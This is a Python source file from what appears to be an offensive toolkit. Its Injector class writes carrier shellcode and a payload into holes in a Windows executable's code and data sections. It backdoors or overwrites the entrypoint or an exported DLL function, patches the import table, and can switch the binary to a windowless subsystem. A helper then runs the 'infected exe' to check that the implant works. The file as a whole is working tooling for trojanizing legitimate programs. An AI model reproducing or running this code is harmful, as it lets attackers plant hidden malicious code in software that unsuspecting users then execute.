from helper import *
import logging
import time
import logging
from typing import Dict, List, Tuple

from model.injectable import Injectable, DataReuseEntry, DataReuseReference
from pe.pehelper import *
from observer import observer
from pe.derbackdoorer import FunctionBackdoorer
from pe.superpe import SuperPe, PeSection
from model.project import Project
from model.settings import Settings
from pe.asmdisasm import *
from model.defs import *
from model.payload import Payload
from model.rangemanager import RangeManager

logger = logging.getLogger("Injector")


class Injector():
    def __init__(
            self, 
            carrier_shc: bytes, 
            payload: Payload,
            injectable: Injectable, 
            settings: Settings): 
        self.carrier_shc = carrier_shc
        self.settings = settings
        self.injectable = injectable
        self.payload = payload

        # superpe is a representation of the exe file. We gonna modify it, and save it at the end.
        # reuse from injectable
        #self.superpe = SuperPe(settings.get_inject_exe_in())
        self.superpe = injectable.superpe
        self.function_backdoorer = FunctionBackdoorer(self.superpe)

        # to find space for carrier and payload
        # for some combination of settings HACK
        self.rdata_manager = self.superpe.get_rdata_rangemanager()
        self.code_manager = self.superpe.get_code_rangemanager()

        self.payload_rva: int = 0
        self.carrier_rva: int = 0


    # ┌───────────┬─────────────────────────────────────┬───────┐
    # │           ├────────┼────────┼───────────────────┤       │
    # │           │Carrier │ 1 Page │ Payload           │       │
    # │           ├────────┼────────┼───────────────────┤       │
    # └───────────┴─────────────────────────────────────┴───────┘
    #
    #  .text                          .rdata                     
    # ┌─────────┬─────────┬───────┐  ┌────────┬─────────┬───────┐
    # │         │         │       │  │        │         │       │
    # │         │ carrier │       │  │        │payload  │       │
    # │         │         │       │  │        │         │       │
    # └─────────┴─────────┴───────┘  └────────┴─────────┴───────┘

    # Backdoor: .rdata random
    def get_random_data_payload_rva(self) -> int:
        complete_size = len(self.payload.payload_data)
        largest_gap = self.rdata_manager.find_holes(complete_size)
        if len(largest_gap) == 0:
            raise Exception('No hole found in code section to fit payload!')
        largest_gap_size = largest_gap[0][1] - largest_gap[0][0]
        offset = largest_gap[0][0]

        rdata_section = self.superpe.get_section_by_name(".rdata")
        if rdata_section == None:
            raise Exception("No .rdata section found in PE file")
        self.rdata_manager.add_range(offset, offset+len(self.payload.payload_data))

        payload_rva = rdata_section.virt_addr + offset
        #self.payload_rva = payload_rva
        return payload_rva
    

    # Backdoor: .text random
    def get_random_code_carrier_rva(self) -> int:
        complete_size = len(self.carrier_shc)
        largest_gap = self.code_manager.find_holes(complete_size)
        if len(largest_gap) == 0:
            raise Exception('No hole found in code section to fit payload!')
        largest_gap_size = largest_gap[0][1] - largest_gap[0][0]
        offset = int((largest_gap_size - complete_size) / 2)  # centered in the .text section
        offset += largest_gap[0][0]
        carrier_rva = self.superpe.get_code_section().VirtualAddress + offset
        return carrier_rva
        

    # Backdoor: .text random
    def get_random_carrier_and_payload_rva_in_code(self) -> Tuple[int, int]:
        complete_size = len(self.carrier_shc) + 4096 + len(self.payload.payload_data)
        largest_gap = self.code_manager.find_holes(complete_size)
        if len(largest_gap) == 0:
            raise Exception('No hole found in code section to fit payload!')
        largest_gap_size = largest_gap[0][1] - largest_gap[0][0]
        offset = int((largest_gap_size - complete_size) / 2)  # centered in the .text section
        offset += largest_gap[0][0]
        carrier_rva = self.superpe.get_code_section().VirtualAddress + offset

        # payload location: behind carrier + 1 page
        if self.settings.carrier_name == "dll_loader_change":
            payload_rva = carrier_rva + len(self.carrier_shc) + 4096 + 4096
            payload_rva = payload_rva & 0xFFFFF000 # page align
        else:
            # no page align
            payload_rva = carrier_rva + len(self.carrier_shc) + 4096

        return payload_rva, carrier_rva
        

    ## Inject

    def inject_exe(self):
        exe_in = self.settings.get_inject_exe_in()
        exe_out = self.settings.get_inject_exe_out()

        logger.info("-[ Injecting Carrier into injectable".format())
        logger.info("    Injectable: {} -> {}".format(exe_in, exe_out))
        logger.info("    Implant IAT fixup if necessary: {}".format(self.settings.fix_missing_iat))

        # Patch IAT (if necessary and wanted)
        self.injectable_patch_iat()

        carrier_shc_len = len(self.carrier_shc)
        carrier_offset: int = 0  # file offset

        if self.settings.carrier_invoke_style == CarrierInvokeStyle.OverwriteFunc:
            if self.settings.payload_location == PayloadLocation.CODE:
                # Carrier and Payload both in .text section in a function
                func_addr: int|None = None
                if self.settings.dllfunc != "" and self.injectable.superpe.is_dll():
                    func_addr = self.superpe.get_export_vaddr_by_name(self.settings.dllfunc)
                else:
                    func_addr = self.superpe.get_entrypoint()
                self.carrier_rva = func_addr

                # payload is behind the carrier shellcode
                self.payload_rva = self.carrier_rva + len(self.carrier_shc)
                    
            elif self.settings.payload_location == PayloadLocation.DATA:
                # Carrier in a function, Payload random in data section
                func_addr: int|None = None
                if self.settings.dllfunc != "" and self.injectable.superpe.is_dll():
                    func_addr = self.superpe.get_export_vaddr_by_name(self.settings.dllfunc)
                else:
                    func_addr = self.superpe.get_entrypoint()

                self.carrier_rva = func_addr

                # payload is somewhere in .rdata section
                self.payload_rva = self.get_random_data_payload_rva()

            # copy carrier shellcode into the code section (at func)
            carrier_offset = self.superpe.get_offset_from_rva(self.carrier_rva)
            self.superpe.pe.set_bytes_at_offset(carrier_offset, self.carrier_shc)
            logger.info("    Inject: OverWrite {} with Carrierat 0x{:X} (0x{:X})".format(
                self.settings.dllfunc if self.settings.dllfunc else "DllMain",
                self.carrier_rva, carrier_offset))

        elif self.settings.carrier_invoke_style == CarrierInvokeStyle.BackdoorFunc:
            if self.settings.payload_location == PayloadLocation.CODE:
                # Carrier and Payload depend on each other (both are in .text)
                self.payload_rva, self.carrier_rva = self.get_random_carrier_and_payload_rva_in_code()
            elif self.settings.payload_location == PayloadLocation.DATA:
                # Carrier and Payload are independent
                self.payload_rva = self.get_random_data_payload_rva()
                self.carrier_rva = self.get_random_code_carrier_rva()

            # copy carrier shellcode into the code section
            carrier_offset = self.superpe.get_offset_from_rva(self.carrier_rva)
            self.superpe.pe.set_bytes_at_offset(carrier_offset, self.carrier_shc)
            logger.info("    Inject: Write Carrier to 0x{:X} (0x{:X})".format(
                self.carrier_rva, carrier_offset))

            # backdoor the function (usually main())
            backdoor_func_addr: int = None
            if self.settings.dllfunc == "":
                backdoor_func_addr = self.superpe.get_entrypoint()
            else:
                backdoor_func_addr = self.superpe.get_export_vaddr_by_name(self.settings.dllfunc)
            logger.info("    Backdoor function: {} (0x{:X})".format(
                self.settings.dllfunc if self.settings.dllfunc else "DllMain", backdoor_func_addr))
            self.function_backdoorer.backdoor_function(
                backdoor_func_addr, self.carrier_rva, carrier_shc_len)

        # Make the injected carrier work, integrate it into the PE
        self.injectable_write_iat_references()
        self.inject_and_reference_data()

        # changes from console to UI (no console window) if necessary
        if self.settings.patch_show_window:
            self.superpe.patch_subsystem()

        # correct checksum
        new_checksum = self.superpe.pe.generate_checksum()
        self.superpe.pe.OPTIONAL_HEADER.CheckSum = new_checksum

        # We done
        logger.info("-[ Write to file: {}".format(exe_out))
        self.superpe.write_pe_to_file(exe_out)

        # Log
        code = file_readall_binary(exe_out)
        in_code = code[carrier_offset:carrier_offset+carrier_shc_len]
        observer.add_code_file("carrier_exe", in_code)


    def injectable_patch_iat(self):
        #logger.info("    Checking if IAT entries required by carrier are available")
        iatRequests = self.injectable.get_all_iat_requests()
        iatMissing = []
        
        for iatRequest in iatRequests:
            # skip available
            addr = self.superpe.get_vaddr_of_iatentry(iatRequest.name)
            if addr != None:
                logger.debug("      Request IAT {} is available at 0x{:X}".format(
                    iatRequest.name, addr))
            else:
                logger.debug("      Request IAT {} is NOT available".format(
                    iatRequest.name))
                iatMissing.append(iatRequest)

        logger.info("    IAT entries missing in injectable for carrier: {}".format(len(iatMissing)))
        for iatRequest in iatMissing:
            # Not available, check if we can patch it
            iat_name = self.superpe.get_replacement_iat_for("KERNEL32.dll", iatRequest.name)
            if not self.settings.fix_missing_iat:
                raise Exception("Error: {} not available, but fix_missing_iat is False".format(
                    iatRequest.name))
            # do the patch
            self.superpe.patch_iat_entry("KERNEL32.dll", iat_name, iatRequest.name)
            logger.info("      Patch injectable to import {}".format(
                    iatRequest.name))
        # we modify the IAT raw, so reparsing is required
        self.superpe.pe.parse_data_directories()
        self.superpe.init_iat_entries()


    def injectable_write_iat_references(self):
        """replace IAT-placeholders in shellcode with call's to the IAT"""
        code = self.superpe.get_code_section_data()
        for iatRequest in self.injectable.get_all_iat_requests():
            for placeholder in iatRequest.references:
                if not placeholder in code:
                    raise Exception("IatResolve ID {} not found, abort".format(placeholder))
                offset_from_code = code.index(placeholder)
                
                # Note that the SuperPe may already have been patched for new IAT imports
                destination_virtual_address = self.superpe.get_vaddr_of_iatentry(iatRequest.name)
                if destination_virtual_address == None:
                    raise Exception("IatResolve: Function {} not found".format(iatRequest.name))
                
                image_base = self.injectable.superpe.get_image_base()
                va = self.superpe.get_code_section().VirtualAddress
                instruction_virtual_address = offset_from_code + image_base + va
                #instruction_virtual_address = offset_from_code + self.injectable.superpe.get_image_base() + self.superpe.get_code_section().VirtualAddress
                logger.debug("      Replace {} at VA 0x{:X} with: call to IAT at VA 0x{:X} ({})".format(
                    placeholder.hex(), 
                    instruction_virtual_address,
                    destination_virtual_address,
                    iatRequest.name
                ))
                jmp = assemble_relative_call(instruction_virtual_address, destination_virtual_address)
                if len(jmp) != len(placeholder):
                    raise Exception("IatResolve: Call to IAT has different length than placeholder: {} != {} abort".format(
                        len(jmp), len(placeholder)
                    ))
                idx = code.index(placeholder)
                code = code.replace(placeholder, jmp)
                asm_disasm(code[idx:idx+7])

        self.superpe.write_code_section_data(code)


    def inject_and_reference_data(self):
        """Inject data into .rdata/.text and replace reusedata_fixup placeholders in code with LEA"""
        reusedata_fixups: List[DataReuseEntry] = self.injectable.get_all_reusedata_fixups()
        if len(reusedata_fixups) == 0:
            # nothing todo
            return
        
        # insert data
        logger.info("    Inject Carrier-data into injectable")
        for datareuse_fixup in reusedata_fixups:
            logger.debug("      Handling DataReuse Fixup: {} (.code: {})".format(
                datareuse_fixup.string_ref, datareuse_fixup.in_code))

            if datareuse_fixup.in_code:  # .text
                shellcode_offset = self.superpe.pe.get_offset_from_rva(self.payload_rva)
                self.superpe.pe.set_bytes_at_offset(shellcode_offset, datareuse_fixup.data)
                payload_rva = self.superpe.pe.get_rva_from_offset(shellcode_offset)
                if payload_rva == None:
                    raise Exception("DataReuseFixup: payload_rva is None")
                datareuse_fixup.addr = payload_rva + self.injectable.superpe.get_image_base()
                logger.debug("        Add to .text at 0x{:X} ({}): {} with size {}".format(
                    datareuse_fixup.addr, payload_rva, datareuse_fixup.string_ref, len(datareuse_fixup.data)))

            else:  # .rdata
                # get a hole in the .rdata section to put our data
                hole_rva = self.rdata_manager.find_hole(len(datareuse_fixup.data))
                if hole_rva == None:
                    raise Exception("No suitable hole with size {} found in .rdata section, abort".format(
                        len(datareuse_fixup.data)
                    ))
                self.rdata_manager.add_range(hole_rva[0], hole_rva[1]+1)  # mark it as used

                var_data = datareuse_fixup.data
                data_rva = hole_rva[0]
                self.superpe.pe.set_bytes_at_rva(data_rva, var_data)
                datareuse_fixup.addr = data_rva + self.injectable.superpe.get_image_base()
                ##
                logger.debug("        Add to .rdata at 0x{:X} ({}): {}: {}".format(
                    datareuse_fixup.addr, data_rva, datareuse_fixup.string_ref, ui_string_decode(var_data)))

        # replace the placeholder in .text with a LEA instruction to the data we written above
        logger.info("    Patch Carrier code to reference the injected data")
        code = self.superpe.get_code_section_data()
        for datareuse_fixup in reusedata_fixups:
            ref: DataReuseReference
            for ref in datareuse_fixup.references:
                if not ref.placeholder in code:
                    raise Exception("fix data in injectable: DataReuse: ID {} ({}) not found in code section, abort".format(
                        ref.placeholder.hex(), datareuse_fixup.string_ref))
                
                offset_from_datasection = code.index(ref.placeholder)
                instruction_virtual_address = offset_from_datasection + self.superpe.get_image_base() + self.superpe.get_code_section().VirtualAddress
                destination_virtual_address = datareuse_fixup.addr
                logger.debug("       Replace bytes {} at VA 0x{:X} with: LEA {} .rdata 0x{:X}".format(
                    ref.placeholder.hex(), instruction_virtual_address, ref.register, destination_virtual_address
                ))
                lea = assemble_lea(
                    instruction_virtual_address, destination_virtual_address, ref.register
                )
                asm_disasm(lea, instruction_virtual_address)  # DEBUG
                if len(lea) != len(ref.placeholder):
                    raise Exception("DataReuseFixup: lea instr has different length than placeholder {}: {} != {} abort".format(
                        ref.placeholder, len(lea), len(ref.placeholder)
                    ))
                code = code.replace(ref.placeholder, lea)

        self.superpe.write_code_section_data(code)


def verify_injected_exe(exefile: FilePath, dllfunc="") -> int:
    logger.info("      Verify infected exe: {} ".format(exefile))
    # remove indicator file
    pathlib.Path(VerifyFilename).unlink(missing_ok=True)

    run_exe(exefile, dllfunc=dllfunc, check=False)
    time.sleep(SHC_VERIFY_SLEEP)
    if os.path.isfile(VerifyFilename):
        logger.info("---> Verify OK. Infected exe works (file was created)")
        # better to remove it immediately
        os.remove(VerifyFilename)
        return 0
    else:
        logger.error("---> Verify FAIL. Infected exe does not work (no file created)")
        return 1
